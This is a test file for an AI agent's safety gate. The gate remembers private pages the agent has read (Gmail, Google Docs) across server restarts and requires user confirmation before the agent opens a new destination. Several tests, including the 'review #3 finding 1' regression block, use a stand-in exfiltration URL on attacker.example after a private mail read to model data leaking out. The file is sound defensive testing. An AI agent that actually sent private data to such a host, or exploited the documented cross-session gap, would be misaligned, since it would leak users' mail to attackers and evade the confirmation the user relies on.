/**
 * `serve --session-state`: the gate's memory for one voice conversation (src/safety/session-state.ts).
 * Round trips, every import rejection, atomic 0600 writes, fail-closed write errors, `--session-state` path
 * validation, and the review #3 finding 1 regression with two server instances sharing the file.
 */
import { chmodSync, chownSync, existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, describe, expect, it } from 'vitest';
import { GATE_STATE_MAX_SKEW_MS, MAX_PRIVATE_SCOPES, MAX_TRUSTED_HOSTS, SafetyGate, validateGateState, type GateState } from '../../src/safety/gate.js';
import {
  bindSessionState,
  checkSessionStatePath,
  readSessionStateFile,
  removeSessionStateFile,
  SESSION_STATE_FILE,
  writeSessionStateFileSync,
} from '../../src/safety/session-state.js';
import { parseServeArgs } from '../../src/serve-args.js';
import { loadConfig } from '../../src/config.js';
import type { Confirmer, ConfirmPrompt, ResolvedConfig } from '../../src/types.js';
import { Conversation } from '../../src/voice/conversation.js';
import { setupDesktop, textOf } from '../desktop/fakes.js';

const tmp = mkdtempSync(join(tmpdir(), 'stephen-session-state-'));
afterAll(() => rmSync(tmp, { recursive: true, force: true }));
let n = 0;
/** A fresh Stephen home with a private voice/ folder. */
function home(): { home: string; voice: string; state: string } {
  const h = join(tmp, `home-${++n}`);
  mkdirSync(join(h, 'voice'), { recursive: true, mode: 0o700 });
  return { home: h, voice: join(h, 'voice'), state: join(h, 'voice', SESSION_STATE_FILE) };
}

const NOW = 1_700_000_000_000;
const SAFETY: ResolvedConfig['safety'] = loadConfig({}, { HOME: tmp, STEPHEN_HOME: join(tmp, 'cfg-home') }).safety;

class Answer implements Confirmer {
  readonly kind = 'dialog' as const;
  prompts: ConfirmPrompt[] = [];
  constructor(public answer: 'approved' | 'declined' = 'approved') {}
  async confirm(p: ConfirmPrompt) {
    this.prompts.push(p);
    return this.answer;
  }
}
const gate = (confirmer: Confirmer = new Answer(), now = () => NOW) =>
  new SafetyGate({ safety: SAFETY, confirmer, audit: { append: async () => undefined } as never, now });

// ───────────────────────────── export / import ─────────────────────────────

describe('SafetyGate.exportState / importState', () => {
  it('round-trips private reads (scope, host, time, order) and trusted hosts', () => {
    const a = gate();
    a.noteRead('https://mail.google.com/mail/u/0/#inbox');
    a.noteRead('https://docs.google.com/document/d/abc123/edit');
    const st = a.exportState();
    expect(st).toEqual({
      version: 1,
      privateReads: [
        { host: 'mail.google.com', scope: 'mail.google.com', at: NOW },
        { host: 'docs.google.com', scope: expect.stringMatching(/^docs\.google\.com\/.*abc123/), at: NOW },
      ],
      trustedHosts: [],
    });
    const b = gate();
    expect(b.importState(JSON.parse(JSON.stringify(st)))).toEqual({ ok: true });
    expect(b.exportState()).toEqual(st);
    expect(b.taintedHosts()).toEqual(['mail.google.com', 'docs.google.com']);
    expect(b.wasRead('https://docs.google.com/document/d/abc123/edit')).toBe(true);
  });

  it('a trust approval is part of the state', async () => {
    const a = gate(new Answer('approved'));
    a.noteRead('https://mail.google.com/mail/u/0/#inbox');
    const r = await a.check({ kind: 'navigate', tool: 'open_url', browser: 'zen', tab: 'z1', pageUrl: 'about:blank', targetUrl: 'https://attacker.example/c?d=1', intent: 'x' });
    expect(r.allowed).toBe(true);
    expect(a.exportState().trustedHosts).toEqual(['attacker.example']);
    const b = gate(new Answer('declined'));
    b.importState(a.exportState());
    expect(b.approvedHosts()).toEqual(['attacker.example']);
  });

  it('import never removes what the gate already holds and keeps the caps', () => {
    const b = gate();
    b.noteRead('https://mail.google.com/');
    const many: GateState = {
      version: 1,
      privateReads: Array.from({ length: MAX_PRIVATE_SCOPES }, (_, i) => ({ host: `h${i}.example`, scope: `h${i}.example`, at: NOW - 1000 })),
      trustedHosts: Array.from({ length: MAX_TRUSTED_HOSTS }, (_, i) => `t${i}.example`),
    };
    expect(b.importState(many)).toEqual({ ok: true });
    const st = b.exportState();
    expect(st.privateReads).toHaveLength(MAX_PRIVATE_SCOPES);
    expect(st.privateReads.at(-1)!.host).toBe('mail.google.com'); // own entries are newest, never dropped first
    expect(st.trustedHosts).toHaveLength(MAX_TRUSTED_HOSTS);
  });

  const good = (): Record<string, unknown> => ({ version: 1, privateReads: [{ host: 'mail.google.com', scope: 'mail.google.com', at: NOW }], trustedHosts: ['example.org'] });
  it.each<[string, (s: Record<string, unknown>) => unknown]>([
    ['not an object', () => 'x'],
    ['an array', () => []],
    ['null', () => null],
    ['wrong version', (s) => ({ ...s, version: 2 })],
    ['extra key', (s) => ({ ...s, mutationTimes: [] })],
    ['missing key', (s) => ({ version: 1, privateReads: s.privateReads })],
    ['privateReads not a list', (s) => ({ ...s, privateReads: {} })],
    ['too many reads', (s) => ({ ...s, privateReads: Array.from({ length: MAX_PRIVATE_SCOPES + 1 }, (_, i) => ({ host: `h${i}.x`, scope: `h${i}.x`, at: NOW })) })],
    ['too many hosts', (s) => ({ ...s, trustedHosts: Array.from({ length: MAX_TRUSTED_HOSTS + 1 }, (_, i) => `t${i}.x`) })],
    ['read with extra field', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: NOW, x: 1 }] })],
    ['host not canonical', () => ({ ...good(), privateReads: [{ host: 'MAIL.google.com', scope: 'MAIL.google.com', at: NOW }] })],
    ['host with a path', () => ({ ...good(), privateReads: [{ host: 'a.com/x', scope: 'a.com/x', at: NOW }] })],
    ['scope of another host', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'b.com', at: NOW }] })],
    ['scope prefix trick', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com.evil', at: NOW }] })],
    ['scope with control chars', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com/x\n', at: NOW }] })],
    ['duplicate scope', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: NOW }, { host: 'a.com', scope: 'a.com', at: NOW }] })],
    ['timestamp in the future', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: NOW + GATE_STATE_MAX_SKEW_MS + 1 }] })],
    ['timestamp zero', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: 0 }] })],
    ['timestamp not an integer', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: 1.5 }] })],
    ['timestamp a string', () => ({ ...good(), privateReads: [{ host: 'a.com', scope: 'a.com', at: String(NOW) }] })],
    ['trusted host not a host', () => ({ ...good(), trustedHosts: ['https://a.com/'] })],
    ['duplicate trusted host', () => ({ ...good(), trustedHosts: ['a.com', 'a.com'] })],
  ])('rejects %s (and changes nothing)', (_what, mk) => {
    expect('error' in validateGateState(mk(good()), NOW)).toBe(true);
    const g = gate();
    g.noteRead('https://outlook.live.com/mail/');
    const before = g.exportState();
    expect(g.importState(mk(good())).ok).toBe(false);
    expect(g.exportState()).toEqual(before);
  });

  it('accepts the valid sample', () => {
    expect(validateGateState(good(), NOW)).toEqual(good());
  });
});

// ───────────────────────────── the file ─────────────────────────────

describe('session-state file', () => {
  const state: GateState = { version: 1, privateReads: [{ host: 'mail.google.com', scope: 'mail.google.com', at: NOW }], trustedHosts: [] };

  it('writes atomically with mode 0600 (whatever the umask) and leaves no temp files', () => {
    const h = home();
    const old = process.umask(0o000);
    try {
      writeSessionStateFileSync(h.state, state);
    } finally {
      process.umask(old);
    }
    expect(statSync(h.state).mode & 0o777).toBe(0o600);
    expect(JSON.parse(readFileSync(h.state, 'utf8'))).toEqual(state);
    expect(readdirSync(h.voice)).toEqual([SESSION_STATE_FILE]);
    expect(readSessionStateFile(h.state)).toEqual({ state });
  });

  it('replaces a planted symlink instead of writing through it', () => {
    const h = home();
    const victim = join(tmp, `victim-${n}`);
    writeFileSync(victim, 'keep');
    symlinkSync(victim, h.state);
    writeSessionStateFileSync(h.state, state);
    expect(readFileSync(victim, 'utf8')).toBe('keep');
    expect(lstatSync(h.state).isFile()).toBe(true);
  });

  it('read: missing is fine; symlink, loose mode, folder, bad JSON, huge, other owner are refused', () => {
    const h = home();
    expect(readSessionStateFile(h.state)).toEqual({ missing: true });
    writeSessionStateFileSync(h.state, state);
    chmodSync(h.state, 0o644);
    expect(readSessionStateFile(h.state)).toEqual({ error: 'has mode 644, not 600' });
    rmSync(h.state);
    const real = join(h.voice, 'real.json');
    writeSessionStateFileSync(real, state);
    symlinkSync(real, h.state);
    expect(readSessionStateFile(h.state)).toEqual({ error: 'is a symlink' });
    rmSync(h.state);
    mkdirSync(h.state);
    expect('error' in readSessionStateFile(h.state)).toBe(true);
    rmSync(h.state, { recursive: true });
    writeFileSync(h.state, '{nope', { mode: 0o600 });
    expect(readSessionStateFile(h.state)).toEqual({ error: 'is not valid JSON' });
    writeFileSync(h.state, ' '.repeat(600 * 1024), { mode: 0o600 });
    expect(readSessionStateFile(h.state)).toEqual({ error: 'is too large' });
    if (process.getuid?.() === 0) {
      writeSessionStateFileSync(h.state, state);
      chownSync(h.state, 4242, 4242);
      expect(readSessionStateFile(h.state)).toEqual({ error: 'belongs to another user' });
    }
    try {
      rmSync(h.state);
      execFileSync('mkfifo', [h.state]);
      chmodSync(h.state, 0o600);
      expect(readSessionStateFile(h.state)).toEqual({ error: 'is not a regular file' });
    } catch {
      /* no mkfifo here */
    }
  });

  it('bind: imports on start, persists every new private read and trust approval before returning', async () => {
    const h = home();
    const g1 = gate(new Answer('approved'));
    bindSessionState(g1, h.state);
    expect(existsSync(h.state)).toBe(false); // nothing to save yet
    g1.noteRead('https://mail.google.com/mail/u/0/#inbox');
    expect(readSessionStateFile(h.state)).toEqual({ state: g1.exportState() }); // written synchronously
    await g1.check({ kind: 'navigate', tool: 'open_url', browser: 'zen', tab: 'z1', pageUrl: 'about:blank', targetUrl: 'https://attacker.example/c?d=1', intent: 'x' });
    expect((readSessionStateFile(h.state) as { state: GateState }).state.trustedHosts).toEqual(['attacker.example']);
    const g2 = gate();
    bindSessionState(g2, h.state);
    expect(g2.exportState()).toEqual(g1.exportState());
  });

  it('bind: writes merge with what another server wrote meanwhile (taint only grows)', () => {
    const h = home();
    const a = gate();
    const b = gate();
    bindSessionState(a, h.state);
    bindSessionState(b, h.state);
    a.noteRead('https://mail.google.com/');
    b.noteRead('https://outlook.live.com/mail/');
    const hosts = (readSessionStateFile(h.state) as { state: GateState }).state.privateReads.map((r) => r.host);
    expect(hosts.sort()).toEqual(['mail.google.com', 'outlook.live.com']);
  });

  it.each([
    ['corrupt JSON', (p: string) => writeFileSync(p, 'garbage', { mode: 0o600 })],
    ['invalid state', (p: string) => writeFileSync(p, '{"version":9}', { mode: 0o600 })],
    ['loose mode', (p: string) => writeFileSync(p, JSON.stringify({ version: 1, privateReads: [], trustedHosts: [] }), { mode: 0o666 })],
  ])('bind: a %s file is ignored and logged', (_what, plant) => {
    const h = home();
    plant(h.state);
    chmodSync(h.state, _what === 'loose mode' ? 0o666 : 0o600);
    const logs: string[] = [];
    const g = gate();
    bindSessionState(g, h.state, { log: (l) => logs.push(l) });
    expect(g.exportState()).toEqual({ version: 1, privateReads: [], trustedHosts: [] });
    expect(logs).toHaveLength(1);
    expect(logs[0]).toMatch(/ignored/);
  });

  it('bind: a failed write fails CLOSED (the read does not complete)', () => {
    const h = home();
    const g = gate();
    const errors: unknown[] = [];
    bindSessionState(g, h.state, { onWriteError: (e) => errors.push(e) });
    chmodSync(h.voice, 0o500); // can't create the temp file
    try {
      if (process.getuid?.() === 0) {
        // root ignores folder permissions: make the destination a non-empty folder so rename() fails
        mkdirSync(h.state);
        writeFileSync(join(h.state, 'x'), '');
      }
      expect(() => g.noteRead('https://mail.google.com/')).toThrow();
      expect(errors).toHaveLength(1);
    } finally {
      chmodSync(h.voice, 0o700);
    }
  });

  it('removeSessionStateFile: missing is fine', () => {
    const h = home();
    removeSessionStateFile(h.state);
    writeSessionStateFileSync(h.state, state);
    removeSessionStateFile(h.state);
    expect(existsSync(h.state)).toBe(false);
  });
});

// ───────────────────────────── serve --session-state ─────────────────────────────

describe('serve --session-state <path>', () => {
  it('accepts an absolute .json path directly inside <home>/voice/ (existing or not)', () => {
    const h = home();
    expect(parseServeArgs(['--confirm', 'dialog', '--voice', '--session-state', h.state], { home: h.home })).toEqual({ confirm: 'dialog', voice: true, sessionState: h.state });
    expect(parseServeArgs([`--session-state=${h.state}`], { home: h.home })).toEqual({ sessionState: h.state });
    writeSessionStateFileSync(h.state, { version: 1, privateReads: [], trustedHosts: [] });
    expect(parseServeArgs(['--session-state', h.state], { home: h.home })).toEqual({ sessionState: h.state });
  });

  it('refuses everything else', () => {
    const h = home();
    const other = home();
    const linkHome = join(tmp, `linkhome-${n}`);
    mkdirSync(linkHome);
    symlinkSync(join(tmp, 'elsewhere'), join(linkHome, 'voice')); // voice/ is a symlink
    mkdirSync(join(tmp, 'elsewhere'), { recursive: true });
    const fileLink = join(h.voice, 'link.json');
    symlinkSync(join(tmp, 'target.json'), fileLink);
    const dirAsFile = join(h.voice, 'dir.json');
    mkdirSync(dirAsFile);
    const cases: [string[], RegExp, string?][] = [
      [['--session-state'], /needs a file path/],
      [['--session-state', 'voice/conversation-state.json'], /absolute/],
      [['--session-state', ''], /needs a file path/],
      [['--session-state', join(h.home, 'conversation-state.json')], /directly inside/],
      [['--session-state', join(h.voice, 'sub', 'x.json')], /directly inside/],
      [['--session-state', `${h.voice}/../voice/x.json`], /normalized/],
      [['--session-state', `${h.voice}//x.json`], /normalized/],
      [['--session-state', other.state], /directly inside/],
      [['--session-state', '/etc/passwd'], /directly inside/],
      [['--session-state', join(h.voice, 'state.txt')], /\.json/],
      [['--session-state', join(h.voice, '.hidden.json')], /\.json/],
      [['--session-state', join(h.voice, '-p.json')], /\.json/],
      [['--session-state', fileLink], /regular file/],
      [['--session-state', dirAsFile], /regular file/],
      [['--session-state', join(linkHome, 'voice', 'x.json')], /real folder/, linkHome],
      [['--session-state', join(tmp, 'nohome', 'voice', 'x.json')], /does not exist/, join(tmp, 'nohome')],
      [['--session-state', h.state, '--session-state', h.state], /twice/],
    ];
    for (const [argv, re, hm] of cases) {
      const r = parseServeArgs(argv, { home: hm ?? h.home });
      expect('error' in r ? r.error : 'accepted', argv.join(' ')).toMatch(re);
    }
    expect(parseServeArgs(['--session-state', h.state])).toEqual({ error: "--session-state: Stephen's home folder is unknown" });
  });

  it('refuses a voice/ folder that resolves outside the (real) home', () => {
    const h = home();
    const realHome = join(tmp, `real-${n}`);
    mkdirSync(join(realHome, 'voice'), { recursive: true });
    const linkedHome = join(tmp, `linked-${n}`);
    symlinkSync(realHome, linkedHome);
    // A symlinked home is fine as long as voice/ is really inside it.
    expect(checkSessionStatePath(join(linkedHome, 'voice', 'x.json'), linkedHome)).toEqual({ path: join(linkedHome, 'voice', 'x.json') });
    expect(checkSessionStatePath(h.state, h.home)).toEqual({ path: h.state });
  });

  it('is owned by this user', () => {
    if (process.getuid?.() !== 0) return; // needs root to chown
    const h = home();
    chownSync(h.voice, 4242, 4242);
    expect(checkSessionStatePath(h.state, h.home)).toEqual({ error: expect.stringMatching(/belong to you/) });
  });
});

// ───────────────────────────── review #3 finding 1: the regression ─────────────────────────────

describe('review #3 finding 1: two servers of ONE conversation share the gate memory', () => {
  const MAIL = 'https://mail.google.com/mail/u/0/#inbox';
  const EXFIL = 'https://attacker.example/c?d=x';
  const intent = 'user asked';

  it('server 1 notes a private read of mail.google.com → server 2 (fresh gate, same state path) asks on open_url, just like server 1', async () => {
    const h = home();
    // Server 1 (command 1): reads Gmail.
    const s1 = await setupDesktop();
    bindSessionState(s1.gate, h.state);
    s1.gate.noteRead(MAIL);
    // What the SAME server would do with the exfiltration URL: ask, declined → not opened.
    s1.confirmer.answer = 'declined';
    const same = await s1.call('open_url', { url: EXFIL, intent });
    expect(same.isError).toBe(true);
    expect(s1.confirmer.prompts).toHaveLength(1);
    expect(s1.mac.opens()).toEqual([]);

    // Server 2 (command 2, a new `stephen serve` with a fresh gate, `--resume`d Claude): same state path.
    const s2 = await setupDesktop();
    bindSessionState(s2.gate, h.state);
    s2.confirmer.answer = 'declined';
    const r = await s2.call('open_url', { url: EXFIL, intent });
    expect(r.isError).toBe(true);
    expect(s2.confirmer.prompts).toHaveLength(1);
    expect(s2.confirmer.prompts[0]!.title).toBe(s1.confirmer.prompts[0]!.title);
    expect(s2.confirmer.prompts[0]!.body).toMatch(/mail\.google\.com/);
    expect(textOf(r)).toMatch(/declined/);
    expect(s2.mac.opens()).toEqual([]);
    expect(s2.audit.entries.at(-1)).toMatchObject({ tool: 'open_url', verdict: 'confirm', outcome: 'denied', args: { rules: expect.arrayContaining(['first-destination']) } });
  });

  it('control: without the shared state the new server opens it with NO prompt (the hole review #3 found)', async () => {
    const s1 = await setupDesktop();
    s1.gate.noteRead(MAIL);
    const s2 = await setupDesktop();
    const r = await s2.call('open_url', { url: EXFIL, intent });
    expect(r.isError).toBeFalsy();
    expect(s2.confirmer.prompts).toEqual([]);
    expect(s2.mac.opens()).toHaveLength(1);
  });

  it('a NEW conversation does not carry the taint (the listener deletes the state file first)', async () => {
    const h = home();
    const s1 = await setupDesktop();
    bindSessionState(s1.gate, h.state);
    s1.gate.noteRead(MAIL);
    expect(existsSync(h.state)).toBe(true);
    // The listener starts a new conversation (window expired / error / Esc): reset before claude starts.
    expect(new Conversation({ dir: h.voice, windowSec: 180 }).begin()).toBeNull();
    expect(existsSync(h.state)).toBe(false);
    const s3 = await setupDesktop();
    bindSessionState(s3.gate, h.state);
    const r = await s3.call('open_url', { url: EXFIL, intent });
    expect(r.isError).toBeFalsy();
    expect(s3.confirmer.prompts).toEqual([]);
  });
});
